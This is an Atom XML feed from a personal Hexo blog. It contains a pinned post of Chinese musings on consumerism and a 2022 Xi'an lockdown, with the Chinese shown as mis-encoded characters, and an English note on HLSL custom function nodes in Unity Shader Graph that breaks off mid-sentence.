<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KYRIOTA</title>
  
  
  <link href="https://kyriota.github.io/atom.xml" rel="self"/>
  
  <link href="https://kyriota.github.io/"/>
  <updated>2022-08-11T16:08:48.087Z</updated>
  <id>https://kyriota.github.io/</id>
  
  <author>
    <name>KYRIOTA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pinned</title>
    <link href="https://kyriota.github.io/2077/07/07/Pinned/"/>
    <id>https://kyriota.github.io/2077/07/07/Pinned/</id>
    <published>2077-07-06T23:07:07.000Z</published>
    <updated>2022-08-11T16:08:48.087Z</updated>
    
    <content type="html"><![CDATA[<p>ğŸ•Š <code>NO PENGUINS</code> ğŸ•Š</p><span id="more"></span><h2 id="ç›®å‰æ„Ÿå…´è¶£çš„ä¸œè¥¿"><a href="#ç›®å‰æ„Ÿå…´è¶£çš„ä¸œè¥¿" class="headerlink" title="ç›®å‰æ„Ÿå…´è¶£çš„ä¸œè¥¿"></a>ç›®å‰æ„Ÿå…´è¶£çš„ä¸œè¥¿</h2><p>å¥½å¥½æ··Unityå§</p><h2 id="éšæƒ³"><a href="#éšæƒ³" class="headerlink" title="éšæƒ³"></a>éšæƒ³</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        å‰è¨€    </div>    <div class='spoiler-content'>        <p>æ„Ÿè§‰æœ‰å¿…è¦åœ¨è‡ªå·±blogé‡Œé¢å¼„ä¸€ä¸ªéšæƒ³å½•ï¼Œæ–¹ä¾¿è®°å½•ä¸€äº›æƒ³æ³•ä»¥åŠè§‚å¯Ÿè‡ªå·±</p><p>ç›®å‰æš‚æ—¶å¼„åœ¨ç½®é¡¶ä¸­ï¼Œä»¥åå¦‚æœæ‰¾åˆ°äº†åˆé€‚çš„åœ°æ–¹å¯èƒ½ä¼šæ¬è¿åˆ°åšå®¢çš„å¦ä¸€å¤„ï¼Ÿ</p><p>è¯„è®ºåŠŸèƒ½è™½ç„¶è²Œä¼¼ä¹Ÿä¸éš¾å¼„ä½†æ˜¯ä¸å‡†å¤‡å¼„ï¼Œå› ä¸ºæœ¬æ¥å°±æƒ³blogä½œä¸ºè‡ªå·±çš„ä¸€ä¸ªéå¸¸privateçš„æ€æƒ³ç©ºé—´ï¼Œå¦‚æœguestsæœ‰ä»€ä¹ˆæƒ³æ³•æˆ‘å¸Œæœ›é€šè¿‡emailæˆ–è€…å…¶ä»–æ–¹æ³•äº¤æµ</p><blockquote><p><b>æ—¢ç„¶è¿™æ˜¯ä¸€ä¸ªprivateçš„æ€æƒ³ç©ºé—´ï¼Œåˆå› ä½ æˆ‘æ˜¯ä¸¤ä¸ªä¸åŒçš„ä¸ªä½“ï¼Œæˆ‘ä»¬å¿…ç„¶æœ‰äº›è®¸è§‚ç‚¹äº§ç”Ÿç¢°æ’ä¸åˆ†æ­§ï¼Œå¯¹æ­¤æˆ‘çš„è§è§£æ˜¯æˆ‘ä»¬ç›¸äº’åŒ…å®¹ï¼Œä¿æŠ¤å½¼æ­¤çš„æ€æƒ³è‡ªç”±ï¼Œæˆ‘å¹¶ä¸å¾ˆè®¤åŒäºŒæç®¡æ€ç»´ã€‚å¯¹äºguestè€Œè¨€ï¼Œæˆ‘å¸Œæœ›æˆ‘å‘é£™çš„è§‚ç‚¹åªæ˜¯ä¸ºä½ æä¾›äº†æ›´åŠ å¤šæ ·çš„è§‚æµ‹ä¸€ä¸ªé—®é¢˜çš„è§’åº¦ï¼Œè€Œéåœ¨å¯¹ä½ è¿›è¡Œè¯´æ•™æˆ–è€…æ´—è„‘ï¼›æ‰€ä»¥å¦‚æœå°Šæ•¬çš„guest samaå¯¹æˆ‘çš„è§‚ç‚¹æœ‰ä»»ä½•ä¸è®¤åŒä¹‹å¤„ï¼Œæˆ‘çš„å»ºè®®æ˜¯æ‚¨å¯ä»¥å°è¯•åˆ†ææˆ‘äº§ç”Ÿè¿™ç§è§’åº¦çš„è§‚ç‚¹çš„åŸå› ä¸èƒŒæ™¯æˆ–è€…ä¸€ç¬‘è€Œè¿‡ï¼Œåœ¨ä¸ç ´åäººé“ä¸»ä¹‰ç­‰ä½œä¸ºä¸€ä¸ªäººçš„åŸºæœ¬æ³•åˆ™çš„å‰æä¸‹æˆ‘è®¤ä¸ºä¸–ç•Œä¸Šæ²¡æœ‰æ€æƒ³çŠ¯ç½ªï¼ŒæœŸå¾…guest samaåœ¨æ—¥åä»æˆ‘çš„éšæƒ³ä¸­è·å–çµæ„Ÿ</b></p></blockquote><p>ä»¥åå¦‚æœè¿™ä¸€éƒ¨åˆ†å†…å®¹å¤ªå¤šå¯èƒ½ä¼šè€ƒè™‘åŠ å…¥å¯¹æ–‡ç« åˆ†é¡µä»¥åŠè‡ªå®šä¹‰çš„æ–‡ç« å®šä½ï¼ˆæ¯”å¦‚è¿™é‡Œçš„éšæƒ³å°±å¾ˆé€‚åˆé€šè¿‡æ—¥æœŸå®šä½ä»€ä¹ˆçš„</p>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        20220702    </div>    <div class='spoiler-content'>        <p>æµ…è°ˆä¸€ä¸‹æˆ‘å¯¹æ¶ˆè´¹ä¸»ä¹‰çš„çœ‹æ³•ï¼Œæ¶ˆè´¹ä¸»ä¹‰ä¹‹æ‰€ä»¥ä¼šå…´èµ·ï¼Œæ˜¯å› ä¸ºç»æµå‘å±•éœ€è¦æ¶ˆè´¹å¸¦åŠ¨ï¼Œè€Œæ¶ˆè´¹ä¸»ä¹‰çš„å…´ç››å¯ä»¥æå¤§ä¿ƒè¿›ç¾¤ä¼—çš„æ¶ˆè´¹æ¬²æœ›ï¼Œåˆå› ä¸ºç»æµå‘å±•èƒ½ä¸ºä¸Šå±‚é˜¶çº§åˆ›é€ åˆ©ç›Šã€åŠ é€Ÿæ”¶å‰²å‰©ä½™ä»·å€¼ï¼Œåœ¨è¿™äº›çš„å‰æä¸‹æ¶ˆè´¹ä¸»ä¹‰å°±ä½¿å¾—ç¾¤ä¼—ç”Ÿæ´»æ°´å¹³ä¹Ÿå¾—åˆ°äº†æå¤§æé«˜ï¼Œäºæ˜¯ä¹æ¶ˆè´¹ä¸»ä¹‰å°±æˆä¸ºäº†å…¨äººç±»æ¨å´‡çš„ä¸»æµè§‚å¿µ</p><p>ä½†ç°åœ¨çš„æ¶ˆè´¹ä¸»ä¹‰åœ¨æˆ‘çœ‹æ¥å¯¹ä¸Šå±‚é˜¶çº§çš„åˆ©ç›Šå¤§äºå…¶åä½œç”¨äºç¾¤ä¼—ç”Ÿæ´»å¸¦æ¥çš„åˆ©ç›Šï¼ŒåŸå› åœ¨äºç°åœ¨æ¶ˆè´¹ä¸»ä¹‰çš„ç¨€ç¼ºæ€§ä¸é™„åŠ ä»·å€¼æ˜¯ä¸Šå±‚é˜¶çº§åœ¨æ€æƒ³å±‚é¢äººä¸ºåˆ›é€ çš„ï¼Œæ‰€ä»¥ç°åœ¨çš„æ¶ˆè´¹ä¸»ä¹‰å’Œä»¥å¾€çš„æ¶ˆè´¹ä¸»ä¹‰æ˜¯æœ‰å¾ˆå¤§åŒºåˆ«çš„ï¼Œå…·ä½“ä¸åšå±•å¼€ã€‚</p><p>è™½ç„¶æˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢æ¶ˆè´¹ä¸»ä¹‰è¿™ä¸€å¥—ï¼Œå³ä¾¿å®ƒèƒ½å¤Ÿå¸¦æ¥ç‰©è´¨ä¸Šçš„äº«å—ï¼Œä½†ç°åœ¨çš„äººç±»ç¤¾ä¼šè¦æ˜¯çªç„¶ç¦»å¼€äº†æ¶ˆè´¹ä¸»ä¹‰ï¼ˆæ˜¾ç„¶æ˜¯ä¸å¯èƒ½ä¸€å¤œæ¶ˆå¤±çš„ï¼‰ï¼Œå°†ä¼šæœ‰éå¸¸å¤šçš„äººå¤±å»å¯¹äººç”Ÿçš„å®šä¹‰ä»¥åŠç›®æ ‡ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¤¾ä¼šç°åœ¨åŸºæœ¬æ˜¯å…¨ç›˜å›´ç»•æ¶ˆè´¹ä¸»ä¹‰å±•å¼€çš„ã€‚</p><p>è¿™é‡Œå¯ä»¥ä¸¾ä¸€ç‚¹ç®€å•çš„ä¾‹å­ï¼šé¦–å…ˆæ˜¯ç¤¾ä¼šçš„è¯„ä»·ä½“ç³»çš„åˆæ­¥è¯„ä»·æ˜¯ä»¥ä¸€ä¸ªäººçš„æ¶ˆè´¹æ°´å¹³æ¥è¯„ä»·çš„ï¼Œä¸¤åé™Œç”Ÿäººï¼šå…¨æ–¹ä½åç‰Œç©¿ç€çš„Aä¸ç©¿ç€çœ‹èµ·æ¥éå¸¸å»‰ä»·çš„Bï¼Œä¸€èˆ¬ä¼šè®¤ä¸ºAçš„ç¤¾ä¼šåœ°ä½ä¼šé«˜äºBï¼Œå³ä½¿æˆ‘ä»¬ä¸èƒ½ç¡®å®šä»–ä»¬çš„å…·ä½“å·¥ä½œä»¥åŠä»–ä»¬è‡ªå·±æ˜¯å¦è®¤åŒæ¶ˆè´¹ä¸»ä¹‰ï¼›å…³äºè„±ç¦»æ¶ˆè´¹ä¸»ä¹‰çš„äººç”Ÿå®šä¹‰ï¼Œè®¾æƒ³ä¸–ç•Œä¸Šæ²¡æœ‰å¦‚è‹¹æœï¼Œå¥”é©°ç­‰åç‰Œï¼Œæˆ¿ä»·ä¹Ÿéƒ½åœ¨åˆç†çš„ä½ä»·èŒƒå›´ï¼Œä»»ä½•å²—ä½çš„å¤±ä¸šç‡ä¸å°±ä¸šç‡å¤„äºéå¸¸å¥åº·çš„çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ¥è¿‘ä¹Œæ‰˜é‚¦çš„ç¤¾ä¼šç¯å¢ƒï¼Œåœ¨è¿™æ ·çš„ç¤¾ä¼šä¸­ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜èƒ½æ‰¾åˆ°èƒ½å¤Ÿæ¿€å‘è‡ªå·±å‰è¿›çš„åŠ¨åŠ›ï¼Œæ›´è¿›ä¸€æ­¥è¯´ï¼Œæ˜¯å¦è¿˜èƒ½æ‰¾åˆ°å‰è¿›çš„ç›®æ ‡ï¼Ÿä¹Ÿè®¸æœ‰äººä¼šè¯´ï¼šæˆ‘æ—©å°±æƒ³è¯•è¯•æ½œæ°´ã€è·³ä¼ä¹‹ç±»çš„ä¹‹å‰æ²¡æœ‰æ¡ä»¶åšçš„äº‹æƒ…äº†ï¼Œä½†å½“æˆ‘ä»¬å¯ä»¥å¤©å¤©è·³ä¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜èƒ½å¤Ÿåˆç†åœ°å°†â€œå°è¯•è·³ä¼â€åˆ—å…¥æˆ‘ä»¬çš„äººç”Ÿ ToDoList å—ï¼Ÿæˆ–è®¸â€œåœ¨æœ‰ç”Ÿä¹‹å¹´æŠŠè‡ªå·±èƒ½å¤Ÿå°è¯•çš„äº‹æƒ…å…¨éƒ¨å°è¯•ä¸€éâ€åœ¨ä¸€ä¸ªä¹Œæ‰˜é‚¦ç¤¾ä¼šä¸‹æ˜¯ä¸€ä¸ªä¸é”™çš„ç›®æ ‡ï¼Œå› ä¸ºå…¶ä¸­åŒ…å«çš„æ˜¯å¯¹æ–°é²œäº‹ç‰©ä¸æœªçŸ¥é¢†åŸŸçš„æ¢ç´¢ç²¾ç¥ã€‚å…¶å®â€œå°è¯•è·³ä¼â€å¹¶éä¸èƒ½åˆ—å…¥äººç”Ÿçš„ ToDoListï¼Œè€Œå…³é”®æ˜¯å…¶æ˜¯å¦åŒ…å«ä»»ä½•çš„â€œäººæ–‡ç²¾ç¥â€ï¼Œå¦‚æœä¸€ä¸ªå¤©ç”Ÿæé«˜è€…å¸Œæœ›å…¶åœ¨å…‹æœè‡ªèº«çš„ä¸€åˆ‡ææƒ§å»å°è¯•è·³ä¼ï¼Œé‚£æˆ‘è®¤ä¸ºå¤§éƒ¨åˆ†äººå°†ä¼šè®¤å¯è¿™ä¸€äººç”Ÿç›®æ ‡ï¼Œå› ä¸ºå…¶ä¸­åŒ…å«äº†å…‹æœå›°éš¾çš„ç²¾ç¥ã€‚å½“ç„¶ï¼Œæˆ‘è®¤ä¸ºåœ¨ç°åœ¨è¿™ä¸ªç¤¾ä¼šä¸­å¤©ç”Ÿæé«˜è€…åº”è¯¥åœ¨å¿™ç€æ“å¿ƒç”Ÿè®¡å’Œå·¥ä½œï¼Œä¸ä¼šæœ‰æ—¶é—´ç®¡è‡ªå·±æ˜¯å¦æé«˜ã€‚</p>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        20220706    </div>    <div class='spoiler-content'>        <p>ä»Šå¤©è¥¿å®‰å¸‚åˆè¿›è¡Œäº†ä¸€æ³¢æé™æ‹‰æ‰¯ï¼Œç¨å¾®è°ˆä¸€ä¸‹ä¸åŒæ™®ç½—ç¾¤ä½“çš„è¡¨ç°æ‰€åæ˜ çš„å¿ƒç†ã€‚</p><p>é¦–å…ˆæ˜¯äº‹å‘ç»è¿‡ï¼Œå…­æœˆåº•è¿˜æ˜¯ä¸ƒæœˆä¸€å·äºŒå·æ¥ç€ï¼Œè¥¿å®‰å‡ºäº†é˜³æ€§ï¼Œæˆ‘ä»¬20çº§å½“æ—¶å·²ç»è€ƒå®ŒæœŸæœ«äº†ï¼Œæ­£åœ¨è¡¥å†›è®­ï¼Œæœ‰äººè¯Ÿç—…è¯´å†›è®­æ—©å°±è¯¥åœäº†å› ä¸ºç–«æƒ…åˆè§è‹—å¤´ï¼Œé‚£å…¶å®ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æ ¡æ–¹åœäº†é‚£å°±å¾—é‡æ–°å®‰æ’ä¸€äº›å·¥ä½œï¼Œå…¶ä»–çº§å¯èƒ½ä¹Ÿä¼šè§‰å¾—ä¸å…¬å¹³ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥æŒ‰ç…§æ ¡æ–¹çš„åˆ©ç›Šé‚£è‚¯å®šæ˜¯ä¸å¾—ä¸åœçš„æ—¶å€™æ‰åœï¼Œäºæ˜¯ä»Šå¤©7.5å°±åˆ°äº†è¿™ä¸ªæ—¶å€™ã€‚</p><p>7.5ä¸Šåˆä¸‹åˆæ­£å¸¸è¿›è¡Œäº†å†›è®­ï¼Œä¸‹åˆ5ç‚¹~6ç‚¹ä¹‹é—´â€œè¥¿å®‰å‘å¸ƒâ€åœ¨å¾®åšå‘äº†è¥¿å®‰7å¤©ä¸´æ—¶ç®¡æ§æªæ–½ï¼Œæ‰§è¡Œæ—¶é—´æ˜¯7.6çš„0ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´æå‰äº†å…­ä¸ªå¤šå°æ—¶å‘äº†ä¸ªå·®ä¸å¤šæ˜¯è­¦å‘Šä½ å°åŸçš„æ¶ˆæ¯ï¼Œé‡Œé¢æ˜ç¡®æåˆ°äº†é«˜æ ¡å°æ ¡ï¼Œé‚£å¾ˆæ˜¾ç„¶å­—é¢æ„æ€å°±æ˜¯ä½ ä»Šå„¿æ™šä¸Šä¸æ¶¦å°±å¾—åœ¨å­¦æ ¡å‘†æœ€å°‘7å¤©ï¼Œè¿™ä¸ªé€šçŸ¥é™¤äº†ä¹‹åä½ ç”µåŸºæœ¬å°±æ˜¯ç‚¸é”…äº†ï¼Œç„¶åå¯¼å‘˜å’Œé¢†å¯¼ä¹Ÿéƒ½ä¸å›åº”è¿™äº‹å„¿ï¼Œæˆ‘åŸæœ¬è®¢çš„7.7çš„é«˜é“ç¥¨ï¼Œç›´æ¥å°±é€€äº†æ”¹æˆå½“æ™šåç»¿çš®å»éƒ‘å·ç„¶åéƒ‘å·é£å›å®¶ï¼Œç»“æœä»–åœ¨å½“æ™š11ç‚¹åˆé€šçŸ¥è¯´â€œæœ€æ–°é€šçŸ¥ï¼šå­¦æ ¡åˆšæ¥åˆ°ä¸Šçº§éƒ¨é—¨æŒ‡ç¤ºï¼Œé«˜æ ¡å¯ä»¥æŒ‰ç…§æ—¢å®šæ”¾å‡è®¡åˆ’å’Œé˜²ç–«è§„å®šæ­£å¸¸ç¦»æ ¡ï¼Œæ˜å¤©è¯¥è¯·å‡å›å®¶çš„æ­£å¸¸ç¦»æ ¡ã€‚â€åˆç€ä½ è¥¿å®‰æ˜¯æ¥é€šè¿‡äº¤é€šåˆºæ¿€ç»æµçš„ï¼Ÿè‡³äºåé¢åˆ°åº•æ˜¯ä»€ä¹ˆæƒ…å†µæˆ‘ä¼°è®¡åº”è¯¥æ˜¯å¯ä»¥æ­£å¸¸å›å®¶çš„ï¼Œå¦‚æœæƒ³å¾—èµ·æ¥é‚£ä¹‹åå†ç»­ä¸€ä¸‹è¿™ä¸€æ®µã€‚</p><p>åˆ°è¿™ä¸ªæ—¶é—´ç‚¹å·²ç»åˆ†ç¦»å‡ºäº†ä¸¤æ³¢ç¾¤ä¼—ï¼Œä¸€æ³¢æ˜¯æ¶¦çš„ï¼Œä¸€æ³¢æ˜¯ç•™æ ¡çš„ï¼Œæœ¬åœ°å­¦ç”Ÿä¸åšè®¨è®ºã€‚</p><p>ç•™æ ¡çš„å¿ƒç†å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼šâ‘ æ— æ‰€è°“å›ä¸å›å®¶ï¼Œè§‰å¾—åœ¨å“ªéƒ½å¯ä»¥â‘¡ä¿¡ä»»å­¦æ ¡è§‰å¾—ä¹‹åä¹Ÿæ˜¯å¯ä»¥å›å®¶çš„â‘¢ä¸çŸ¥é“æ€ä¹ˆåŠèµ°ä¸€æ­¥æ˜¯ä¸€æ­¥çš„â‘£èº«è¾¹çš„äººä¸æ¶¦æ‰€ä»¥ä¹Ÿä¸æ¶¦çš„ã€‚</p><p>æ¶¦çš„å¿ƒç†å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼šâ‘ å½’å¿ƒä¼¼ç®­çš„â‘¡ä¸ä¿¡ä»»å­¦æ ¡çš„â‘¢èº«è¾¹çš„äººæ¶¦æ‰€ä»¥ä¹Ÿæ¶¦çš„ã€‚</p><p>è¿™äº‹ä¸€å‡ºå…¶å®å­¦æ ¡å·²ç»å¯ä»¥åˆ’åˆ†å‡ºæ¯”è¾ƒæ˜æ˜¾çš„å·¦æ´¾å’Œå³æ´¾äº†ï¼Œæˆ‘è‡ªå·±æ¶¦çš„åŸå› æ˜¯ï¼šâ‘ å›å»é™ªå¥³æœ‹å‹â‘¡è§‰å¾—å°æ§å¯èƒ½ä¼šåœ¨7dayçš„åŸºç¡€ä¸Šéšç€ç–«æƒ…çˆ†å‘ç»§ç»­ç´¯åŠ â‘¢å®¤å‹åˆšå¥½æä¾›äº†éƒ‘å·æœ‰ç¥¨çš„é€”å¾„è€Œä¸”å®¤å‹ä¹Ÿæ˜¯éƒ‘å·ä¸­è½¬ï¼Œå…¶å®æˆ‘æ˜¯æ²¡æœ‰è€ƒè™‘åˆ°å­¦æ ¡åœ¨åé¢è¿˜èƒ½åœ¨è¿™ä¸ªå°æ ¡çš„é€šçŸ¥ä¸‹æ¥ä¹‹åè¿˜è¯´ä¸å°çš„ï¼Œç°åœ¨çœ‹æ¥å…¶å®ä»»ä½•ç®¡ç†æ–¹å¯¹äºæ™®ç½—ç¾¤ä¼—çš„æƒ…ç»ªå’Œè¡Œä¸ºéƒ½æ˜¯ä¸éœ€è¦è´Ÿè´£çš„ï¼Œæ¯”å¦‚è¿™æ¬¡è¥¿å®‰å‘å¸ƒå°æ ¡é€šçŸ¥ï¼Œå­¦æ ¡å‘å¸ƒä¸å°æ ¡é€šçŸ¥æ¨ç¿»ä¹‹å‰çš„é€šçŸ¥ï¼Œè¿™ä¸ªé€šçŸ¥åè½¬çš„çœŸç©ºæœŸå‘ç”Ÿçš„äº‹æƒ…ç”±è°è´Ÿè´£ï¼Ÿé‚£è‚¯å®šå°±æ˜¯ä½ è‡ªå·±ï¼šå¦‚æœä½ é€‰æ‹©ç•™æ ¡ï¼Œåé¢ç–«æƒ…çˆ†å‘èƒ½å›å®¶çš„æ—¶é—´ä¸€ç›´ä¸èƒ½ç¡®å®šï¼Œé‚£è¥¿å®‰å·²ç»å‘äº†é€šçŸ¥ï¼Œæ˜¯ä½ è‡ªå·±ä¸èµ°çš„ï¼›å¦‚æœä½ é€‰æ‹©èµ°ï¼Œé‚£ä½ èµ°äº†å°±å’Œå­¦æ ¡ç­¾äº†ç¦»æ ¡çš„åè®®ï¼Œâ€œç¦»æ ¡åçš„å®‰å…¨è‡ªå·±è´Ÿè´£â€ã€‚</p><p>è™½ç„¶æ²¡æœ‰æƒ³åˆ°åè½¬å¾—è¿™ä¹ˆä¸¥é‡ï¼Œä½†æ˜¯è‡ªå·±è´Ÿè´£è‡ªå·±åœ¨è¿™æ®µæ—¶é—´çš„è¡Œä¸ºè¿™ä»¶äº‹æˆ‘æ˜¯æœ‰è®¤çŸ¥çš„ï¼Œè€Œä¸€ä¸ªäººåªè¦åœ¨åšä¸€äº‹æƒ…ä¹‹å‰è€ƒè™‘æ¸…æ¥šäº†è¿™ä»¶äº‹å¸¦æ¥çš„åæœä»¥åŠè‡ªå·±æ˜¯å¦æ„¿æ„æ‰¿æ‹…å…¶åæœï¼Œé‚£è¿™ä¸ªäººå¯¹è¿™ä»¶äº‹çš„æ‰§è¡Œå°±æ˜¯åœ¨ä¸ªäººå±‚é¢ä¸Šå¯ä»¥è¢«è‚¯å®šçš„ï¼Œè¿™æœŸé—´æˆ‘çš„è€ƒè™‘å¦‚ä¸‹ï¼šå¦‚æœæˆ‘ç«‹åˆ»å¼¹å‡ºï¼Œé‚£ä¹ˆæˆ‘éœ€è¦ä»˜å‡ºçš„å°±æ˜¯åç»¿çš®ç«è½¦å’Œé«˜é“æ¢é£æœºçš„å¤šå‡ºæ¥çš„å¼€æ”¯ï¼Œæ”¶ç›Šå°±æ˜¯ä¸ç”¨å†è·Ÿä½ ç”µå’Œè¥¿å®‰æ‹‰æ‰¯ï¼Œç„¶åèƒ½æå‰ä¸€å¤©è·Ÿå¯¹è±¡è§é¢ï¼›å¦‚æœæˆ‘ç•™æ ¡è§‚å¯Ÿå½¢åŠ¿ï¼Œé‚£ä¹ˆæˆ‘éœ€è¦ä»˜å‡ºçš„å°±æ˜¯è¥¿å®‰éšæ—¶å¯èƒ½å˜åŒ–çš„ç–«æƒ…ï¼Œå› ä¸ºç¬¬äºŒå¤©7.6çš„é«˜é“ç¥¨å·²ç»å”®ç©ºï¼Œæˆ‘åœ¨7.5çš„æ—¶å€™åªæœ‰7.7çš„ç›´è¾¾é«˜é“ç¥¨ï¼Œæ‰€ä»¥æˆ‘éœ€è¦æ‰¿æ‹…ä¸¤å¤©ä¹‹å†…ç–«æƒ…çªç„¶åŠ é‡çš„é£é™©ä»¥åŠåˆ°åº•èƒ½ä¸èƒ½åœ¨å°æ§çš„7å¤©å†…å›å®¶çš„ä¸ç¡®å®šæ€§ï¼Œæ”¶ç›Šå°±æ˜¯çœäº†ä¸‰å››ç™¾å—çš„è·¯è´¹ã€‚æˆ‘è§‰å¾—ä¸‰å››ç™¾å—è·¯è´¹ä¹°ä¸€ä¸ªç¡®å®šæ€§é‚£æ˜¯å€¼å¾—çš„ï¼Œè€Œä¸”æ˜¯ç¬¬ä¸€æ¬¡åç»¿çš®ï¼Œä¹Ÿç®—æ˜¯ä¸°å¯Œäººç”Ÿé˜…å†äº†ï¼Œæ‰€ä»¥å¯¹ç»¿çš®æ²¡æœ‰ä»€ä¹ˆåæ„Ÿå’Œéš¾å—çš„ï¼Œç»¼ä¸Šï¼Œæ¶¦çš„æ”¶ç›Šå¯¹æˆ‘æ¥è¯´å¤§äºç•™æ ¡çš„æ”¶ç›Šï¼Œæ‰€ä»¥æˆ‘æ¶¦ã€‚</p><p>æ¶¦å’Œä¸æ¶¦å°±æ˜¯ä¸¤ç§å¤§è‡´çš„ä¸ªæ€§å»¶ä¼¸å‡ºçš„ä¸¤ç§å¯¹ç«‹ç«‹åœºï¼Œæ¶¦çš„äººå’Œä¸æ¶¦çš„äººæœ¬è´¨ä¸Šä¹Ÿéƒ½è¿˜æ˜¯åœ¨ä¸Šå±‚çš„æŒ‡ç¤ºä¸‹åˆ†åŒ–å‡ºçš„ä¸¤ç§è¡Œä¸ºæ¨¡å¼ï¼Œæ—¢ç„¶å¤§å®¶éƒ½æ˜¯æ™®ç½—ç¾¤ä¼—ï¼Œé‚£å°±æ²¡æœ‰ä¼˜è¶Šä¹‹åˆ†ã€‚åŒºåˆ†è¿™ç§ä¼˜è¶Šçš„äººä¹Ÿè®¸åº”è¯¥è‡ªçœä¸€ä¸‹ï¼Œå¯¹æ–¹å’Œè‡ªå·±æ˜¯å¦éƒ½æ˜¯ambiguous policyçš„å—å®³è€…ï¼Œæ—¢ç„¶éƒ½æ˜¯åŒä¸€ä¸ªå±‚çº§çš„äººï¼Œé“æ‹³æŒ¥å‘å—å®³è€…æ—¶è®¤ä¸ºå—å®³è€…æœ‰ç½ªï¼Œé‚£é“æ‹³æŒ¥å‘è‡ªå·±æ—¶ä½ æ˜¯å¦ä¹ŸæœŸå¾…ä»–äººè®¤ä¸ºä½ ä¸æ˜¯æ— è¾œçš„ï¼Ÿé—®ï¼šçœŸæ­£æœ‰ç½ªçš„æ˜¯ä»€ä¹ˆï¼Ÿè‡ªå·±é€‰æ‹©äº†æ¶¦æˆ–è€…ä¸æ¶¦ï¼Œå´å¹¶æ²¡æœ‰åœ¨é€‰æ‹©ä¹‹å‰æ‹¿å‡ºå……è¶³çš„ç†ç”±çš„äººï¼Œä¹Ÿè®¸åœ¨ä¸‹æ¬¡åšä¸€ä»¶äº‹æƒ…ä¹‹å‰åº”è¯¥è¿›è¡Œæ›´ç»†è‡´çš„è€ƒè™‘ï¼Œæ˜ç¡®è‡ªå·±åšä¸€ä»¶äº‹æƒ…çš„åŠ¨æœºæ‰èƒ½åšå¥½â€œèµ°è‡ªå·±çš„è·¯â€</p>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;ğŸ•Š &lt;code&gt;NO PENGUINS&lt;/code&gt; ğŸ•Š&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>HLSL Note</title>
    <link href="https://kyriota.github.io/2022/08/12/HLSL_Note/"/>
    <id>https://kyriota.github.io/2022/08/12/HLSL_Note/</id>
    <published>2022-08-12T15:19:00.000Z</published>
    <updated>2022-08-12T15:21:24.882Z</updated>
    
    <content type="html"><![CDATA[<p>A post to record HLSL stuff related to unity shader graph programing.</p><p><code><small>&lt;The date of this post will be changed once it updates&gt;</small></code></p><span id="more"></span><h1 id="HLSL-Note"><a href="#HLSL-Note" class="headerlink" title="HLSL Note"></a>HLSL Note</h1><h2 id="Custom-Function-Node"><a href="#Custom-Function-Node" class="headerlink" title="Custom Function Node"></a>Custom Function Node</h2><p>When coding the HLSL include file, I found the custom function node in the shader graph never stops throwing out errors that I canâ€™t understand like this:</p><p><img src="/images/HLSLNote_CustomFuctionError.png"></p><p>Any programmer can never allow any red or yellow stuff in his code, so I tried really hard to locate the error, but find nothing useful at the end. Thereâ€™s little information about how I can get rid of this error, until I accidently folded the preview in the node by referring an unsolved post on unity forum questioning that â€œwhy is my custom function node keeps throwing out errors though <strong>THE OVERALL SHADER IS WORKING FINE</strong> ?â€ and the error disappears. My feeling was so mixed and in chaos at that moment.</p><p>It seems that you cannot call functions or use structs in URP Library directly, thatâ€™s why <code>SHADERGRAPH_PREVIEW</code> is defined when node tries to draw preview image.</p><p>Referring some other shader graph custom functions like the one below, we can see that they hard code the variables that should use functions in URP Library to get (such as <code>GetMainLight()</code>) to get a preview from the node (maybe also for performance in node preview).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void MainLight_float(float3 WorldPos, out float3 Direction, out float3 Color, out float DistanceAtten, out float ShadowAtten)</span><br><span class="line">&#123;</span><br><span class="line">    #if SHADERGRAPH_PREVIEW</span><br><span class="line">        Direction &#x3D; float3(-0.5, 0.5, 0);</span><br><span class="line">        Color &#x3D; float3(1, 0.95, 0.8);</span><br><span class="line">        DistanceAtten &#x3D; 1;</span><br><span class="line">        ShadowAtten &#x3D; 1;</span><br><span class="line">    #else</span><br><span class="line">        #if SHADOWS_SCREEN</span><br><span class="line">            float4 clipPos &#x3D; TransformWorldToHClip(WorldPos);</span><br><span class="line">            float4 shadowCoord &#x3D; ComputeScreenPos(clipPos);</span><br><span class="line">        #else</span><br><span class="line">            float4 shadowCoord &#x3D; TransformWorldToShadowCoord(WorldPos);</span><br><span class="line">        #endif</span><br><span class="line">        Light mainLight &#x3D; GetMainLight(shadowCoord);</span><br><span class="line">        Direction &#x3D; mainLight.direction;</span><br><span class="line">        Color &#x3D; mainLight.color;</span><br><span class="line">        DistanceAtten &#x3D; mainLight.distanceAttenuation;</span><br><span class="line">        ShadowAtten &#x3D; mainLight.shadowAttenuation;</span><br><span class="line">    #endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>However, the final preview 